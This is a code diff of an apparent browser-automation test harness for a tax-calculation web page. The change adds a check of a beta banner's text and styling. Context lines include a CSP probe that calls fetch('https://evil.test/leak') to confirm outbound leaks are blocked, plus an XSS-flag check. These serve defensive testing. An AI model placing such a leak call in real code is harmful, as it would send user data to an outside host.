@@ -54,7 +54,7 @@ async function scenario(files, opts) {
   const cspProbe = opts.cspProbe ? await page.evaluate(async () => { try { await fetch('https://evil.test/leak'); return 'sent'; } catch (e) { return 'blocked'; } }) : null;
   const res = await page.evaluate(() => ({ headline: S.de.headline, total: S.de.total, unmatched: S.de.unmatched.map(u => u.sym), big: document.querySelector('#headline .big').textContent,
     warnings: document.getElementById('warnings').innerText, rateSource: S.rateSource, bgVisible: document.getElementById('bg').style.display !== 'none',
-    xss: window.__xss || null, csp: !!document.querySelector('meta[http-equiv="Content-Security-Policy"]'), inlineScripts: [...document.scripts].filter(x => !x.src).length, h2: document.querySelector('#headline h2').textContent, files: S.files.map(f => f.name), sales: document.querySelectorAll('#sales tr').length - 1, estimate: S.de.estimate }));
+    xss: window.__xss || null, beta: (() => { const b = document.querySelector('.wrap').firstElementChild; return { text: b.textContent.trim(), cls: b.className, bg: getComputedStyle(b).backgroundColor }; })(), csp: !!document.querySelector('meta[http-equiv="Content-Security-Policy"]'), inlineScripts: [...document.scripts].filter(x => !x.src).length, h2: document.querySelector('#headline h2').textContent, files: S.files.map(f => f.name), sales: document.querySelectorAll('#sales tr').length - 1, estimate: S.de.estimate }));
   await browser.close();
   return { ...res, res0, cspProbe, atLoad, requests: reqs, site, tries, errors };
 }
